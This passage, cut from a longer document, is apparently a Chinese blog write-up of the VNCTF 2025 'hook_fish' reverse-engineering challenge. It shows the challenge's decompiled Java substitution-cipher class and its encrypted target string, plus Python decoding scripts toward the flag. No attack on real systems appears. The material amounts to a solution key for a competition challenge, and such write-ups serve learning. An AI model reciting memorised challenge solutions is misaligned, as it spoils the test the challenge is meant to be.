class="number">0</span>; i2 &lt; str3.length; i2++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str3[i2] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">            str3[i2] = (<span class="type">char</span>) ((str3[i2] - <span class="string">&#x27;1&#x27;</span>) + (i2 % <span class="number">4</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str3[i2] = (<span class="type">char</span>) (str3[i2] + <span class="string">&#x27;7&#x27;</span> + (i2 % <span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 1</strong>：首先，将输入字符串转为字节数组，并且每个字节加上 68。</p>
<p><strong>步骤 2</strong>：将字节数组转换成十六进制字符串。</p>
<p><strong>步骤 3</strong>：通过 <code>code()</code> 方法对十六进制字符数组进行加密，依次对每对字符进行异或操作。</p>
<p><strong>步骤 4</strong>：修改字符数组中的字符。如果字符是 <code>a-f</code> 范围内的，会根据索引进行计算；否则根据其他规则进行修改。</p>
<p>并且发现其中反复提到<code>fish.hook_fish</code>里面应该也是加密算法，而且还会产生dex文件，这个东西得想办法搞到，问GPT知道可以把<code>apk</code>后缀改成<code>zip</code>进行解压，解压之后发现有四个dex文件，挨着看，看完之后发现好像解压没屌用，发现咩找到那个文件，直接放在010里面搜一下</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250209-220553.jpg" alt="1"></p>
<p>反编译得到源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fish;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: D:\LearnigForCyberSecurity\CTF\CTF-Writeups\VNCTF\hook_fish\hook_fish.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hook_fish</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Character&gt; fish_dcode;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Character, String&gt; fish_ecode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">strr</span> <span class="operator">=</span> <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">hook_fish</span><span class="params">()</span> &#123;</span><br><span class="line">        encode_map();</span><br><span class="line">        decode_map();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;Character, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;iiijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;ijjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;iijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;j&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jjjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;jijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;iijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;o&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;jiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;jijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;ijjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;iijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;y&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;jijjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;iliii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;jiili&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jilji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;iliji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;iljji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;0&#x27;</span>, <span class="string">&quot;jjjli&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;String, Character&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&quot;iiijj&quot;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjii&quot;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijij&quot;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjijj&quot;</span>, <span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjjj&quot;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjjj&quot;</span>, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjji&quot;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijii&quot;</span>, <span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiji&quot;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiji&quot;</span>, <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjij&quot;</span>, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijji&quot;</span>, <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiij&quot;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijji&quot;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjij&quot;</span>, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiji&quot;</span>, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijijj&quot;</span>, <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijii&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiii&quot;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiij&quot;</span>, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjji&quot;</span>, <span class="string">&#x27;u&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiij&quot;</span>, <span class="string">&#x27;v&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiij&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijij&quot;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiji&quot;</span>, <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijjj&quot;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijjl&quot;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiilj&quot;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliii&quot;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiili&quot;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jilji&quot;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliji&quot;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjlj&quot;</span>, <span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijljj&quot;</span>, <span class="string">&#x27;8&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iljji&quot;</span>, <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjli&quot;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_ecode.get(Character.valueOf(str.charAt(i))));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i2 &lt; str.length() / <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i + <span class="number">5</span>;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_dcode.get(str.substring(i, i3)));</span><br><span class="line">            i2++;</span><br><span class="line">            i = i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.equals(<span class="built_in">this</span>.strr)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面就很容易看出解密逻辑，先写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密映射表 (fish_dcode)，参考你提供的 `hook_fish` 中的 `fish_dcode`</span></span><br><span class="line">fish_dcode = &#123;</span><br><span class="line">    <span class="string">&quot;iiijj&quot;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jijij&quot;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;ijjjj&quot;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;iijii&quot;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;jjjij&quot;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jijji&quot;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;iijji&quot;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;jiiji&quot;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;jijii&quot;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;ijjji&quot;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iijij&quot;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;jijjj&quot;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iliii&quot;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;jiili&quot;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;jilji&quot;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;iliji&quot;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;iljji&quot;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;jjjli&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">encoded_str</span>):</span><br><span class="line">    decoded_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 每 5 个字符为一组进行解密</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded_str), <span class="number">5</span>):</span><br><span class="line">        encoded_char = encoded_str[i:i + <span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> encoded_char <span class="keyword">in</span> fish_dcode:</span><br><span class="line">            decoded_str += fish_dcode[encoded_char]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decoded_str += <span class="string">&#x27;?&#x27;</span>  <span class="comment"># 如果遇到未知字符，则使用 &#x27;?&#x27; 表示</span></span><br><span class="line">    <span class="keyword">return</span> decoded_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟解密加密后的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 假设这是加密过的字符串</span></span><br><span class="line">    encrypted_str = <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串: &quot;</span>, decode(encrypted_str))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 解密后的字符串:  0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</span></span><br></pre></td></tr></table></figure>

<p>但是如何把这个东西变成flag呢，就是根据上面的解密算法，反着给写出来就好了</p>
<p>最终exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span></span><br><span class="line">ij_dict = &#123;<span class="string">&quot;iiijj&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">           <span class="string">&quot;jjjii&quot;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jijij&quot;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjijj&quot;</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjjjj&quot;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijjjj&quot;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjjji&quot;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iijii&quot;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijiji&quot;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iiiji&quot;</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjjij&quot;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jijji&quot;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijiij&quot;</span>: <span 